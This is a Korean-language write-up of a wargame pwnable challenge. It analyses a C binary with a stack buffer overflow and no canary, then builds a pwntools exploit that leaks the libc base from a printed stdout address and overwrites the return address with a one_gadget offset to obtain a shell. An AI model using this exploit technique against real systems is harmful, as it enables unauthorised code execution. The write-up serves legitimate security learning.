# 바이너리 분석

```
// gcc -o oneshot1 oneshot1.c -fno-stack-protector -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if(check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}
```

## Leak libc base

`printf("stdout: %p\n", stdout);`를 통해 `stdout`이 메모리에 매핑된 주소를 알 수 있는데, `stdout`은 `libc`에 존재하기 때문에 `stdout`의 `offset`을 해당 주소에서 빼주면 `libc_base`를 구할 수 있다.

여기서, 처음에 `readelf -s ./libc.so.6 | grep stdout`을 통해 아래와 같이 `stdout`이 존재하는 것을 확인하고, `libc.symbols['stdout']` 으로 `offset`을 구했는데,

<img width="760" alt="image" src="https://github.com/user-attachments/assets/588954bd-09d6-4e1f-b5bd-a06c28fc6e12">

**`libc.symbols['_IO_2_1_stdout_']` 으로 `offset`을 구해야 했어서 이것 때문에 시간이 오래걸렸다.**

## Overwrite return address : `canary`가 존재하지 않기 때문에 가능

```
char msg[16];
size_t check = 0;

...

read(0, msg, 46);

if(check > 0) {
    exit(0);
}

```
를 보면, `read(0, msg, 46);` 을 통해 `msg`의 공간보다 더 큰 공간에 값을 채워넣을 수 있는데, `gdb`를 통해 바이너리를 분석해보면 `msg`는 `rbp-0x20`에 위치하기 때문에, `46`만큼 입력을 받으면 딱 `\x00\x00`을 제외한 `return address`의 공간에 임의의 주소를 채워넣을 수 있다.

`46 = 0x10(msg) + 0x8(buf) + 0x8(check) + 0x8(rbp) + 0x6(return address의 \x00\x00제외)` 이기 때문이다. (`check`의 위치는 아래 스크린샷에서 확인)

이 공간은 위에서 구한 `libc_base`에 `one_gadget`을 통해 쉘코드가 실행되도록 조작할 수 있다.

근데, 아래를 보면 `check > 0`인 경우 `exit(0);` 로 `return address`에 도달하기 전 바이너리가 종료될 수 있기 때문에, `msg`를 통해 `46`의 공간만큼 덮어쓸 때, `check`의 메모리에는 `0`을 대입하도록 해야한다.

`gdb`를 통해 살펴보면 `check`는 `rbp-0x8`에 위치하기 때문에 이 공간을 유의하여 `b'\x00' * 8` 을 전달해줘야 한다.

### `msg`의 위치

<img width="651" alt="image" src="https://github.com/user-attachments/assets/5e743065-25a2-4253-a5cd-a279469d0e0c">

### `check`의 위치

<img width="626" alt="image" src="https://github.com/user-attachments/assets/8f66400c-ccb8-4c60-ad65-0c1e03fa9551">

## one_gadget 사용

이번 바이너리에 사용된 `libc` 파일은 `libc.so.6` 인데, 해당 라이브러리에는 아래와 같이 4개의 `one_gadget`이 존재한다.

`main`에서 `return`을 한 후, `one_gadget`을 호출하는 상황에서의 레지스터 값을 찾아보면 아래에서 `rax == NULL` 조건과, `[rsp + 0x70] == NULL` 조건의 `one_gadget`만 사용 가능함을 알 수 있다.

![image](https://github.com/user-attachments/assets/f777ae4c-af7f-4167-9f6c-40370f1c905c)

# Exploit

위에서 분석한 바이너리를 통해 실제 Exploit 코드를 작성해보자.

## 1. Leak libc base

```
# [1] Leak libc base
p.recvuntil(b'stdout: ')
libc_stdout = int(p.recvline()[:-1], 16) # b'0x..' 형식으로 출력되기 때문에 16진수로 해석 후 int로 변환해줘야함(u64는 b'\x--\x--' 형식에만 사용 가능)
libc_base = libc_stdout - libc.symbols['_IO_2_1_stdout_']

# 아래의 두 stdout으로는 안됨 (readelf -s 로 찾은거)
# libc_base = libc_stdout - libc.symbols['stdout']
# libc_base = libc_stdout - 0x3c5708
```

`stdout: ` 이 출력된 후 나오는 `stdout`이 매핑된 메모리 주소를 `libc_stdout`에 저장한다.

이때, `printf("stdout: %p\n", stdout);` 으로 출력하기 때문에 `0x--` 형식으로 출력되고, 뒤에 `\n`이 붙어서 나오기 때문에 

먼저 `p.recvline()[:-1]` 으로 `\n`을 날려주고, `int(p.recvline()[:-1], 16)`을 통해 입력 받은 `0x--` 형식의 `string`을 16진수로 해석하여 `int`로 변환해줘야 한다.

`fho` 워게임 문제의 바이너리에서처럼 `printf("%d")` 형식이나 `printf(%lld)`로 출력을 받았다면 바로 `u64()`로 언패킹이 가능하지만, `%p` 로 받았을 때는 무조건 16진수로 해석 후 `int`로 변환해줘야 한다.

그리고, 구한 `libc_stdout`에서 `stdout`의 `offset`인 `libc.symbols['_IO_2_1_stdout_']`을 빼주어서 `libc_base`를 구할 수 있다.

`libc.symbols['stdout']`이나, `readelf -s`로 구한 `offset`을 빼주면 안되는 것을 잘 기억하자.

## 2. Overwrite return address

```
# [2] Overwrite return address
# 주석이 안된 2개의 가젯만 main이 return한 후 return address에 갔을 때 조건을 만족함
og = libc_base + 0x45216 # rax == NULL
# og = libc_base + 0x4526a # [rsp+0x30] == NULL
# og = libc_base + 0xf02a4 # [rsp+0x50] == NULL
og = libc_base + 0xf1147 # [rsp+0x70] == NULL

# stack은 주소 방향이 반대이므로, 리틀엔디언 잘 생각하기
payload = b'a' * 0x18       # msg(0x10) + buf(0x8)
payload += b'\x00' * 0x8    # check(0x8)
payload += b'a' * 0x8       # sfp(0x8)
payload += p64(og)[:-2]     # return address(0x8) : [:-2]를 해도 어쩌피 뒤에 b'\x00\x00'은 알아서 짤려서 안해줘도 되긴 함

# 아래처럼 하면 반대 방향으로 들어감
# payload = p64(og)[:-2]
# payload += b'a' * 0x8
# payload += b'\x00' * 0x8
# payload += b'a' * 0x18

p.send(payload)
p.interactive()
```

원가젯을 `libc_base`에 더해주면 되는데, 주석을 하지 않은 두 조건만 위에서 확인했듯이 원가젯의 조건에 맞기 때문에 사용할 수 있다.

그리고 `read(0, msg, 46);` 을 통해, `46 bytes` 크기 만큼 입력을 받을 수 있는데, 스택은 낮은 주소에서 높은 주소로 입력이 들어가는 것과, 리틀엔디언은 `MSB(left most)`가 가장 낮은 주소에 들어간다는 것을 잘 기억해서 `payload`를 작성해야 한다.

`payload`는 `aaa...\x00\x00...aaa...\xas\x23..\x7f` 형식인데, `MSB` 부터 `rbp-0x20`에 차례대로 들어가니까 마지막에 `og`가 `return address`에 들어가는 것을 알 수 있고, `48`이 아닌 `46`의 크기에 입력이 가능하므로,

맨 뒤의 `\x00\x00`을 명시적으로 `[:-2]`를 통해 날려줬다. (날려주지 않아도 알아서 `46` 크기를 초과한 `2`는 짤리기 때문에 `[:-2]`를 안해줘도 상관없긴 하다.)

아래 스크린 샷을 통해, `msg`에 `a\n`(`\x61\x0a`)을 입력했을 때의 상황을 보고 잘 이해해보자.

![image](https://github.com/user-attachments/assets/be395f9c-4755-47c5-ac26-704bbc30c4ed)
